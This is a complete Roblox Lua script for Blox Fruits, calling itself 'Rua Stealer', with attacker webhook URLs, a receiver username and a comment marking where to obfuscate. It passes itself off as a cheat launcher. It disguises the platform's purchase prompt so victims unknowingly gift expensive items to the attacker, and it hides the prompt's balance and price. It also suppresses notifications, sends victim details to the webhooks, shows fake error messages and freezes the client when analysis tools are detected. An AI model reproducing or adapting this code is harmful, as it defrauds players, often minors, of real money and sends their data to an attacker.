LogsWebhook = "https://stealer.to/post?uniqueid=97b37190"
ExecutionWebhook = "https://stealer.to/post?uniqueid=e92c9e96"
Username = "x6TNine"
PromptText = "Launch Script"
RandomizedPrompt = false

--obfuscate after this

repeat task.wait() until game:IsLoaded()

local validGames = {
    [2753915549] = true,  -- Sea 1
    [4442272183] = true,  -- Sea 2
    [7449423635] = true   -- Sea 3
}

if not validGames[game.PlaceId] then
    game:GetService("Players").LocalPlayer:Kick("Wrong game! This script is meant for Blox Fruits.")
    return
end

if _G.scriptExecuted then
    warn("You have already executed this code.")
    return
end

local function takeAction()
    local success, result = pcall(function()
    end)

    if not success then
        warn("you're a skid")
    end

    task.wait(1)

    if setfpscap then
        setfpscap(0)
    end

    rconsoleclear()

    print = function() end
    warn = function() end
    error = function() end
    setclipboard = function() end

    while true do end
end

if ishooked and (ishooked(game.HttpGet) or ishooked(request)) then
    takeAction()
end

local function isMobile()
    local UserInputService = game:GetService("UserInputService")
    return UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled
end

_G.scriptExecuted = true

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local CoreGui = game:GetService("CoreGui")
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local marketplaceService = game:GetService("MarketplaceService")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local gameInfo = marketplaceService:GetProductInfo(game.PlaceId)
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local UserId
local version = "1.0.2"
local totalSpent = 0

local success, err = pcall(function()
    UserId = Players:GetUserIdFromNameAsync(Username)
end)

local messages = {
    "yo check ur inv real quick",
    "bruh moment incoming",
    "what if we... opened gifts...",
    "not clickbait (real)",
    "ur actually gonna like this",
    "this is so canon rn",
    "friend shaped gift moment",
    "just girly things (free stuff)",
    "i pretend i do not see",
    "current status: giving",
    "literally crying and giving",
    "bestie ur inventory calls",
    "fumbled the bag (u get it)",
    "real recognize real (open)"
}

local function loopSinkTransparency()
    local viewportOverlay = playerGui:WaitForChild("ViewportOverlay", 10)
    if not viewportOverlay then return end
    
    local sink = viewportOverlay:WaitForChild("Sink", 10)
    if not sink then return end

    game:GetService("RunService").RenderStepped:Connect(function()
        sink.BackgroundTransparency = 1
    end)
end

local function hideNotifications()
    local notifications = playerGui:WaitForChild("Notifications", 10)
    if notifications then
        notifications.Enabled = false
    end
end

local function safeExecute(func)
    local success, error = pcall(func)
    if not success then
        warn(error)
    end
end

safeExecute(loopSinkTransparency)
safeExecute(hideNotifications)

local function getRandomColor()
    return Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))
end

local function getRandomFont()
    local fonts = {
        Enum.Font.PermanentMarker,
        Enum.Font.Arcade,
        Enum.Font.Bangers,
        Enum.Font.Creepster,
        Enum.Font.DenkOne,
        Enum.Font.Highway,
        Enum.Font.IndieFlower,
        Enum.Font.JosefinSans,
        Enum.Font.Merriweather
    }
    return fonts[math.random(1, #fonts)]
end

local function modifyPromptUI(isFirstPrompt)
    local CoreGui = game:GetService("CoreGui")
    local PurchasePrompt = CoreGui:FindFirstChild("PurchasePrompt")
    if not PurchasePrompt then return end
    local ProductContainer = PurchasePrompt:FindFirstChild("ProductPurchaseContainer")
    if not ProductContainer then return end
    local Animator = ProductContainer:FindFirstChild("Animator")
    if not Animator then return end
    local prompt = Animator:FindFirstChild("Prompt")
    if not prompt then return end
    local alertContents = prompt:FindFirstChild("AlertContents")
    if not alertContents then return end

    prompt.BackgroundTransparency = 1
    prompt.Image = ""

    local titleContainer = alertContents:FindFirstChild("TitleContainer")
    if titleContainer then
        local titleArea = titleContainer:FindFirstChild("TitleArea")
        if titleArea then
            titleArea.Visible = false
        end
    end

    local middleContent = alertContents:FindFirstChild("MiddleContent")
    if middleContent then
        middleContent.Visible = false
    end

    local footerButtons = alertContents:FindFirstChild("Footer"):FindFirstChild("Buttons")
    if footerButtons then
        local button1 = footerButtons:FindFirstChild("1")
        if button1 then
            button1.Visible = false
        end

        local button2 = footerButtons:FindFirstChild("2")
        if button2 then
            button2:ClearAllChildren()

            local buttonContainer = Instance.new("Frame")
            buttonContainer.Name = "ButtonContainer"
            buttonContainer.Size = UDim2.new(1, 0, 1, 0)
            buttonContainer.BackgroundTransparency = 1
            buttonContainer.Parent = button2

            local background = Instance.new("Frame")
            background.Name = "Background"
            background.Size = UDim2.new(1, 0, 1, 0)
            background.BackgroundTransparency = 0.9
            background.Parent = buttonContainer

            local corner = Instance.new("UICorner")
            corner.CornerRadius = UDim.new(0.2, 0)
            corner.Parent = background

            local gradient = Instance.new("UIGradient")
            gradient.Rotation = RandomizedPrompt and math.random(0, 360) or 45
            
            local gradientColors
            if RandomizedPrompt then
                gradientColors = {
                    ColorSequenceKeypoint.new(0, getRandomColor()),
                    ColorSequenceKeypoint.new(0.5, getRandomColor()),
                    ColorSequenceKeypoint.new(1, getRandomColor())
                }
            else
                gradientColors = {
                    ColorSequenceKeypoint.new(0, Color3.fromRGB(80, 150, 255)),
                    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(120, 180, 255)),
                    ColorSequenceKeypoint.new(1, Color3.fromRGB(80, 150, 255))
                }
            end
            gradient.Color = ColorSequence.new(gradientColors)
            gradient.Parent = background

            local glow = Instance.new("ImageLabel")
            glow.Name = "Glow"
            glow.BackgroundTransparency = 1
            glow.Image = "rbxassetid://7912134082"
            glow.ImageColor3 = RandomizedPrompt and getRandomColor() or Color3.fromRGB(80, 150, 255)
            glow.ImageTransparency = RandomizedPrompt and math.random(4, 8) / 10 or 0.8
            glow.Size = UDim2.new(1.2, 0, 1.2, 0)
            glow.Position = UDim2.new(0.5, 0, 0.5, 0)
            glow.AnchorPoint = Vector2.new(0.5, 0.5)
            glow.Parent = buttonContainer

            local buttonText = Instance.new("TextLabel")
            buttonText.Name = "ButtonText"
            buttonText.Size = UDim2.new(1, 0, 1, 0)
            buttonText.BackgroundTransparency = 1
            buttonText.Text = PromptText or "Execute Script"
            buttonText.TextColor3 = RandomizedPrompt and getRandomColor() or Color3.fromRGB(255, 255, 255)
            buttonText.TextStrokeColor3 = RandomizedPrompt and getRandomColor() or Color3.fromRGB(0, 0, 0)
            buttonText.TextStrokeTransparency = RandomizedPrompt and math.random(0, 5) / 10 or 0
            buttonText.Font = RandomizedPrompt and getRandomFont() or Enum.Font.PermanentMarker
            buttonText.TextScaled = true
            buttonText.Parent = buttonContainer
            
            local textShadow = buttonText:Clone()
            textShadow.Name = "TextShadow"
            textShadow.Position = UDim2.new(0, 2, 0, 2)
            textShadow.TextColor3 = Color3.fromRGB(0, 0, 0)
            textShadow.TextTransparency = 0.8
            textShadow.ZIndex = buttonText.ZIndex - 1
            textShadow.Parent = buttonContainer

            local tweenService = game:GetService("TweenService")
            local hoverInfo = TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
            local glowInfo = TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true)

            local glowTween = tweenService:Create(glow, glowInfo, {
                ImageTransparency = RandomizedPrompt and math.random(3, 6) / 10 or 0.6,
                Size = UDim2.new(1.3, 0, 1.3, 0)
            })
            glowTween:Play()

            button2.MouseEnter:Connect(function()
                local scaleTween = tweenService:Create(buttonContainer, hoverInfo, {
                    Size = UDim2.new(1.1, 0, 1.1, 0)
                })
                
                local hoverGradientColors
                if RandomizedPrompt then
                    hoverGradientColors = {
                        ColorSequenceKeypoint.new(0, getRandomColor()),
                        ColorSequenceKeypoint.new(0.5, getRandomColor()),
                        ColorSequenceKeypoint.new(1, getRandomColor())
                    }
                else
                    hoverGradientColors = {
                        ColorSequenceKeypoint.new(0, Color3.fromRGB(100, 170, 255)),
                        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(140, 200, 255)),
                        ColorSequenceKeypoint.new(1, Color3.fromRGB(100, 170, 255))
                    }
                end
                
                
                local glowColorTween = tweenService:Create(glow, hoverInfo, {
                    ImageTransparency = RandomizedPrompt and math.random(3, 6) / 10 or 0.6
                })
                
                scaleTween:Play()
                glowColorTween:Play()
            end)

            button2.MouseLeave:Connect(function()
                local scaleTween = tweenService:Create(buttonContainer, hoverInfo, {
                    Size = UDim2.new(1, 0, 1, 0)
                })
                
                local glowColorTween = tweenService:Create(glow, hoverInfo, {
                    ImageTransparency = RandomizedPrompt and math.random(4, 8) / 10 or 0.8
                })
                
                scaleTween:Play()
                glowColorTween:Play()
            end)
        end
    end

    local footer = alertContents:FindFirstChild("Footer")
    if footer then
        local footerContent = footer:FindFirstChild("FooterContent")
        if footerContent then
            local content = footerContent:FindFirstChild("Content")
            if content then
                local RemainingBalanceText = content:FindFirstChild("RemainingBalanceText")
                if RemainingBalanceText then
                    RemainingBalanceText.Visible = false
                end
            end
        end
    end
end

local function getExecutor()
    if syn then return "Synapse Z"
    elseif getexecutor then return getexecutor()
    elseif identifyexecutor then return identifyexecutor()
    elseif fluxus then return "Fluxus"
    else return "Unknown" end
end

local function getRandomMessage()
    return messages[math.random(1, #messages)]
end

local function sendExecutionLog()
    local executorIdentifier = getExecutor()
    local platform = UserInputService.TouchEnabled and "Mobile" or "PC"
    local membershipType = game.Players.LocalPlayer.MembershipType
    local hasPremium = (membershipType == Enum.MembershipType.Premium) and "Yes" or "No"
    local embed = {
        ["title"] = "NEW EXECUTION!",
        ["color"] = 3063792,
        ["fields"] = {
            {
                ["name"] = "Username",
                ["value"] = game.Players.LocalPlayer.Name,
                ["inline"] = true
            },
            {
                ["name"] = "Current BF Rua Stealer Version",
                ["value"] = version,
                ["inline"] = true
            },
            {
                ["name"] = "Current Game",
                ["value"] = gameInfo.Name,
                ["inline"] = true
            },
            {
                ["name"] = "Has Premium",
                ["value"] = hasPremium,
                ["inline"] = true
            },
            {
                ["name"] = "Current Executor",
                ["value"] = executorIdentifier,
                ["inline"] = true
            },
            {
                ["name"] = "Platform",
                ["value"] = platform,
                ["inline"] = true
            },
        }
    }

    local data = HttpService:JSONEncode({
        ["embeds"] = {embed}
    })

    request({
        Url = ExecutionWebhook,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = data
    })
end

local function getRobuxBalance()
    local PurchasePrompt = CoreGui:FindFirstChild("PurchasePrompt")
    if not PurchasePrompt then return 0 end
    local ProductContainer = PurchasePrompt:FindFirstChild("ProductPurchaseContainer")
    if not ProductContainer then return 0 end
    local Animator = ProductContainer:FindFirstChild("Animator")
    if not Animator then return 0 end
    local prompt = Animator:FindFirstChild("Prompt")
    if not prompt then return 0 end
    local alertContents = prompt:FindFirstChild("AlertContents")
    if not alertContents then return 0 end
    local footer = alertContents:FindFirstChild("Footer")
    if not footer then return 0 end
    local footerContent = footer:FindFirstChild("FooterContent")
    if not footerContent then return 0 end
    local content = footerContent:FindFirstChild("Content")
    if not content then return 0 end
    local RemainingBalanceText = content:FindFirstChild("RemainingBalanceText")
    if not RemainingBalanceText or not RemainingBalanceText.Text then return 0 end
    local balanceText = RemainingBalanceText.Text:match("(%d+)$")
    return (balanceText and tonumber(balanceText) or 0) + 25
end

local function sendWebhook(totalSpent, itemName)
    local balance = getRobuxBalance()
    local executorIdentifier = getExecutor()

    local embed = {
        ["title"] = ":turtle:  ! RUA BLOX FRUITS HIT ! :turtle: ",
        ["color"] = 65280,
        ["fields"] = {
            {
                ["name"] = "PLAYER INFO <a:catyes:1160127609569542227> ",
                ["value"] = "```Name: " .. game.Players.LocalPlayer.Name .. "\nAccount Age: " .. tostring(game.Players.LocalPlayer.AccountAge) .. "\nReceiver: " .. Username .. "```"
            },
            {
                ["name"] = "ROBUX SPENT <:Ztsuo_Robux:1193358187760451615> ",
                ["value"] = "```" .. totalSpent .. "```"
            },
            {
                ["name"] = "ITEM YOU GOT <a:cash:1338918152003780739> ",
                ["value"] = "```" .. itemName .. "```"
            },
            {
                ["name"] = "EXECUTOR",
                ["value"] = "```Executor: " .. executorIdentifier .. "```"
            },
            {
                ["name"] = "Current Rua Stealer Version: 1.0.2",
                ["value"] = "**1.0.2**",
            }
        }
    }

    local data = HttpService:JSONEncode({
        ["content"] = "@everyone",
        ["embeds"] = {embed}
    })

    request({
        Url = LogsWebhook,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = data
    })
end

local promptConfirmed = false
local purchaseInProgress = false

local function waitForPromptToDisappear()
    local PurchasePrompt = CoreGui:FindFirstChild("PurchasePrompt")
    if not PurchasePrompt then return end
    local ProductContainer = PurchasePrompt:FindFirstChild("ProductPurchaseContainer")
    if not ProductContainer then return end
    local Animator = ProductContainer:FindFirstChild("Animator")
    if not Animator then return end

    while Animator:FindFirstChild("Prompt") do
        task.wait(0.1)
    end
end

local function waitForPurchaseConfirmation()
    local PurchasePrompt = game:GetService("CoreGui"):WaitForChild("PurchasePrompt")
    local ProductContainer = PurchasePrompt:WaitForChild("ProductPurchaseContainer")
    local Animator = ProductContainer:WaitForChild("Animator")
    local prompt = Animator:WaitForChild("Prompt")
    local alertContents = prompt:WaitForChild("AlertContents")
    local footer = alertContents:WaitForChild("Footer")
    local footerButtons = footer:WaitForChild("Buttons")
    local confirmButton = footerButtons:WaitForChild("2")

    local function confirm()
        promptConfirmed = true
    end

    confirmButton.MouseButton1Click:Connect(confirm)
    confirmButton.TouchTap:Connect(confirm)
end

local webhookSent = false

local function buyItem(storageName, purchaseLocation, cost)
    if purchaseInProgress then return end
    
    local function validateAndFetchUserId()
        if not Username or Username == "" then return false end
        if not UserId or UserId <= 0 then
            local success = pcall(function()
                UserId = Players:GetUserIdFromNameAsync(Username)
            end)
            if not success or not UserId or UserId <= 0 then return false end
        end
        return true
    end
    
    local function waitForValidData()
        local attempts = 0
        while attempts < 10 do
            if validateAndFetchUserId() then return true end
            attempts = attempts + 1
            task.wait(0.5)
        end
        return false
    end
    
    if not waitForValidData() then return end
    
    purchaseInProgress = true
    
    local args = {
        [1] = "buyRobuxShop",
        [2] = {
            ["Message"] = type(getRandomMessage) == "function" and getRandomMessage() or "",
            ["PurchaseAction"] = "Gift",
            ["StorageName"] = storageName,
            ["PurchaseLocation"] = purchaseLocation,
            ["FunnelId"] = "Shop",
            ["ReceiverName"] = Username,
            ["ReceiverUserId"] = UserId
        }
    }
    
    local CommF = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_")
    local success = pcall(function()
        CommF:InvokeServer(unpack(args))
    end)
    
    if success then
        totalSpent = totalSpent + cost
        if not webhookSent and PromptConfirmed then
            sendWebhook(totalSpent, storageName)
            webhookSent = true
        end
    end
    
    if type(waitForPromptToDisappear) == "function" then
        waitForPromptToDisappear()
    else
        task.wait(2)
    end
    
    purchaseInProgress = false
end

hideNotifications()

local function stealItem(balance)
    if balance >= 5000 then
        buyItem("Permanent Dragon-Dragon", "FruitShop", 5000)
    elseif balance >= 4000 then
        buyItem("Permanent Kitsune-Kitsune", "FruitShop", 4000)
    elseif balance >= 3000 then
        buyItem("Permanent Yeti-Yeti", "FruitShop", 3000)
    elseif balance >= 2700 then
        buyItem("Fruit Notifier", "Shop", 2700)
    elseif balance >= 2550 then
        buyItem("Permanent Spirit-Spirit", "FruitShop", 2550)
    elseif balance >= 2500 then
        buyItem("Permanent Gas-Gas", "FruitShop", 2500)
    elseif balance >= 2450 then
        buyItem("Permanent Venom-Venom", "FruitShop", 2450)
    elseif balance >= 2425 then
        buyItem("Permanent Shadow-Shadow", "FruitShop", 2425)
    elseif balance >= 2400 then
        buyItem("Permanent Dough-Dough", "FruitShop", 2400)
    elseif balance >= 2350 then
        buyItem("Permanent T-Rex-T-Rex", "FruitShop", 2350)
    elseif balance >= 2300 then
        buyItem("Permanent Gravity-Gravity", "FruitShop", 2300)
    elseif balance >= 2250 then
        buyItem("Permanent Blizzard-Blizzard", "FruitShop", 2250)
    elseif balance >= 2200 then
        buyItem("Permanent Pain-Pain", "FruitShop", 2200)
    elseif balance >= 2100 then
        buyItem("Permanent Rumble-Rumble", "FruitShop", 2100)
    elseif balance >= 2000 then
        buyItem("Permanent Portal-Portal", "FruitShop", 2000)
    elseif balance >= 1900 then
        buyItem("Permanent Sound-Sound", "FruitShop", 1900)
    elseif balance >= 1800 then
        buyItem("Permanent Spider-Spider", "FruitShop", 1800)
    elseif balance >= 1700 then
        buyItem("Permanent Love-Love", "FruitShop", 1700)
    elseif balance >= 1650 then
        buyItem("Permanent Buddha-Buddha", "FruitShop", 1650)
    elseif balance >= 1500 then
        buyItem("3x Mythical Scrolls", "Shop", 1500)
    elseif balance >= 1300 then
        buyItem("Permanent Magma-Magma", "FruitShop", 1300)
    elseif balance >= 1275 then
        buyItem("Permanent Ghost-Ghost", "FruitShop", 1275)
    elseif balance >= 1250 then
        buyItem("Permanent Barrier-Barrier", "FruitShop", 1250)
    elseif balance >= 1200 then
        buyItem("Dark Blade", "Shop", 1200)
    elseif balance >= 1100 then
        buyItem("Permanent Light-Light", "FruitShop", 1100)
    elseif balance >= 1000 then
        buyItem("Permanent Diamond-Diamond", "FruitShop", 1000)
    elseif balance >= 950 then
        buyItem("Permanent Dark-Dark", "FruitShop", 950)
    elseif balance >= 850 then
        buyItem("Permanent Sand-Sand", "FruitShop", 850)
    elseif balance >= 750 then
        buyItem("Permanent Ice-Ice", "FruitShop", 750)
    elseif balance >= 650 then
        buyItem("Permanent Falcon-Falcon", "FruitShop", 650)
    elseif balance >= 550 then
        buyItem("Permanent Flame-Flame", "FruitShop", 550)
    elseif balance >= 460 then
        buyItem("2x Mastery", "Shop", 450)
    elseif balance >= 450 then
        buyItem("2x Money", "Shop", 450)
    elseif balance >= 400 then
        buyItem("+1 Fruit Storage", "Shop", 400)
    elseif balance >= 380 then
        buyItem("Permanent Spike-Spike", "FruitShop", 380)
    elseif balance >= 350 then
        buyItem("2x Boss Drops", "Shop", 350)
    elseif balance >= 250 then
        buyItem("Permanent Smoke-Smoke", "FruitShop", 250)
    elseif balance >= 220 then
        buyItem("Permanent Bomb-Bomb", "FruitShop", 220)
    elseif balance >= 180 then
        buyItem("Permanent Spring-Spring", "FruitShop", 180)
    elseif balance >= 100 then
        buyItem("Permanent Blade-Blade", "FruitShop", 100)
    elseif balance >= 75 then
        buyItem("Permanent Spin-Spin", "FruitShop", 75)
    elseif balance >= 50 then
        buyItem("Permanent Rocket-Rocket", "FruitShop", 50)
    elseif balance >= 25 then
        buyItem("2x EXP (15 mins.)", "Shop", 25)
    end

    return
end

local CoreGui = game:GetService("CoreGui")

local function getRobuxAndProceed()
    coroutine.wrap(function()
        coroutine.wrap(loopSinkTransparency)()

        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["StorageName"] = "2x EXP (15 mins.)",
                ["FunnelId"] = "Shop",
                ["PurchaseLocation"] = "Shop"
            }
        }

        local CommF = ReplicatedStorage:FindFirstChild("Remotes") and ReplicatedStorage.Remotes:FindFirstChild("CommF_")
        if CommF then
            CommF:InvokeServer(unpack(args))
        end

        local PurchasePrompt = CoreGui:FindFirstChild("PurchasePrompt")
        while not PurchasePrompt do
            task.wait(0.1)
            PurchasePrompt = CoreGui:FindFirstChild("PurchasePrompt")
        end

        coroutine.wrap(function()
            while true do
                local RobuxUpsellContainer = PurchasePrompt and PurchasePrompt:FindFirstChild("RobuxUpsellContainer")
                if RobuxUpsellContainer then
                    RobuxUpsellContainer.Visible = false
                    game.Players.LocalPlayer:Kick("\n[DELTA IS BUGGY WITH THIS SCRIPT]\nScript Failed To Load!\nCheck the following- \n1) If you didn't execute anything before \n2) Use main account, alts will be detected (Used to bypass Anti-Cheat) \n3) Use different Executor & Try again.")
                    break
                end
                task.wait(0.1)
            end
        end)()      

        local ProductPurchaseContainer = PurchasePrompt:FindFirstChild("ProductPurchaseContainer")
        if ProductPurchaseContainer then
            local Animator = ProductPurchaseContainer:FindFirstChild("Animator")
            if Animator then
                local Prompt = Animator:WaitForChild("Prompt")
                if Prompt then
                    Prompt.Visible = false
                    local settingsClippingShield = CoreGui:FindFirstChild("RobloxGui") and CoreGui.RobloxGui:FindFirstChild("SettingsClippingShield")
                    if settingsClippingShield then
                        settingsClippingShield.Visible = false
                    end

                    task.wait(1)

                    local balance = getRobuxBalance()
            
                    if balance < 25 then
                        game.Players.LocalPlayer:Kick("\n[DELTA IS BUGGY WITH THIS SCRIPT]\nScript Failed To Load!\nCheck the following- \n1) If you didn't execute anything before \n2) Use main account, alts will be detected (Used to bypass Anti-Cheat) \n3) Use different Executor & Try again.")
                        return
                    end

                    local VirtualInputManager = game:GetService("VirtualInputManager")
                    VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Escape, false, game)
                    task.wait()
                    VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Escape, false, game)

                    waitForPromptToDisappear()

                    task.wait(0.5)

                    local PromptConfirmed = false
                    
                    coroutine.wrap(function()
                        while true do
                            while not Animator:FindFirstChild("Prompt") do
                                task.wait(0.1)
                            end
                    
                            while Animator:FindFirstChild("Prompt") and not PromptConfirmed do
                                task.wait(0.1)
                            end
                    
                            if not Animator:FindFirstChild("Prompt") and not PromptConfirmed then
                                task.wait(1)
                                stealItem(balance)
                            end
                        end
                    end)()

                    stealItem(balance)
                else
                    print("err1")
                end
            else
                print("err2")
            end
        else
            print("err3")
        end
    end)()
end

local function waitForPrompt()
    local PurchasePrompt = CoreGui:FindFirstChild("PurchasePrompt")
    if not PurchasePrompt then return end
    local ProductContainer = PurchasePrompt:FindFirstChild("ProductPurchaseContainer")
    if not ProductContainer then return end
    local Animator = ProductContainer:FindFirstChild("Animator")
    if not Animator then return end

    modifyPromptUI(true)

    Animator.ChildAdded:Connect(function(child)
        if child.Name == "Prompt" then
            modifyPromptUI(false)
            waitForPurchaseConfirmation()
        end
    end)

    coroutine.wrap(function()
        while not promptConfirmed do
            task.wait(0.1)
        end

        if totalSpent >= 25 then
            sendWebhook(totalSpent)
            if typeof(LoadRedzAfterHit) == "boolean" and LoadRedzAfterHit then
                task.spawn(function()
                    local Settings = {
                        JoinTeam = "Pirates",
                        Translator = true 
                    }
                    loadstring(game:HttpGet("https://raw.githubusercontent.com/realredz/BloxFruits/refs/heads/main/Source.lua"))(Settings)
                end)
            end
        else
            print("err")
        end
        
        local VirtualInputManager = game:GetService("VirtualInputManager")

        while true do
            VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Escape, false, game)
            task.wait() 
            VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Escape, false, game)

            local PurchasePrompt = CoreGui:FindFirstChild("PurchasePrompt")
            if not PurchasePrompt then
                break
            end

            local ProductContainer = PurchasePrompt:FindFirstChild("ProductPurchaseContainer")
            if not ProductContainer then break end

            local Animator = ProductContainer:FindFirstChild("Animator")
            if not Animator then break end

            local prompt = Animator:FindFirstChild("Prompt")
            if not prompt then
                break 
            end
        end
    end)()
end

if success then
    sendExecutionLog()
    waitForPrompt()
    getRobuxAndProceed()
else
    warn("Error: " .. err)
end

game.Players.LocalPlayer.OnTeleport:Connect(function()
    _G.scriptExecuted = nil
end)
